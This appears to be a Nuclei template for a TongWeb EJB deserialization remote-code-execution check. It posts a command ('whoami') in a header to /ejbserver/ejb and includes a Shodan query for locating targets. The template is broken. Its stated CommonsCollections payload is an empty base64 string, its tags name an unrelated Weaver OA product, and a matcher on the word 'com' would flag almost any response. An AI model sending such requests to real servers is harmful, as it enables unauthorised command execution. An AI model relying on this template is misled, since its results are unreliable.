id: tongweb-ejb-deserialization

info:
  name: TongWeb EJB Deserialization RCE
  author: yourname
  severity: critical
  description: |
    TongWeb application server is vulnerable to remote code execution via deserialization 
    in the /ejbserver/ejb endpoint. This template sends a CommonsCollections-based payload 
    that executes 'whoami' and checks for common system usernames in the response.
  reference:
    - https://www.tongweb.com.cn/
    - internal-vuln-report
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    verified: true
    vendor: TongTech
    product: TongWeb
    shodan-query: http.title:"TongWeb" OR http.component:"TongWeb"
  tags: rce,deserialization,tongweb,ejb,java,泛微oa,weaver,泛微-协同办公OA

variables:
  cmd: "whoami"

requests:
  - raw:
      - |
        POST /ejbserver/ejb HTTP/1.1
        Host: {{Hostname}}
        akjdwq: {{cmd}}
        Content-Type: application/octet-stream
        User-Agent: Mozilla/5.0

        {{base64_decode("")}}

    matchers-condition: and
    matchers:
      # 条件1: 响应体必须非空（排除 Content-Length: 0 的情况）
      - type: dsl
        dsl:
          - "len(body) > 0"

      # 条件2: 响应体必须包含 TongWeb EJB 特征（来自你的真实 PoC 响应）
      - type: word
        part: body
        words:
          - "com.tongweb.tongejb"
          - "com"
          - "tongweb"

    extractors:
      - type: regex
        part: body
        regex:
          - "(?i)(root|administrator|tongweb|user|www-data|daemon|system|nt authority\\\\system)"
          - "uid=\\d+\\([a-z0-9_-]+\\)"